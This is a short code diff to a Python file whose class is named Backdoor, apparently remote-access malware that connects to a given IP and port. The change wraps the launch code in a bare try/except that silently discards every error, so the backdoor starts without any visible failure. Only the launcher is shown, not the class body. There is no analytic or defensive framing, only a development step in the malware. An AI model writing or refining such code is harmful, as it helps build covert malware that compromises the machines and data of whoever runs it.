@@ -181,9 +181,10 @@ class Backdoor:
 
 
 def runner():
-    if __name__ == '__main__':
-        starter = Backdoor(ip, port)
-        starter.run()
-
-
+    try:
+        if __name__ == '__main__':
+            starter = Backdoor(ip, port)
+            starter.run()
+    except:
+        pass
 runner()
